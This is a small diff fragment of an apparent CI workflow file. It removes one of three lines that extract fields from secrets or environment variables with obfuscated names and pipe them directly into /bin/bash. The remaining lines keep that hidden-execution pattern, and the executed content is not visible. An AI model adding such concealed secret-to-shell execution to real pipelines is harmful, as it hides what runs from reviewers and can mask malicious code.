@@ -20,7 +20,6 @@ jobs:
           ttj1: ${{ secrets.ttj1 }}
         run: |
           printf '%s' "$ttj1" | jq -r .qihz10 | /bin/bash
-          echo $rgd66141 | jq -r .rns9 | /bin/bash
           printf '%s' "$qirau6" | jq -r .zuxa43619 | /bin/bash
 
       - name: Save artifact
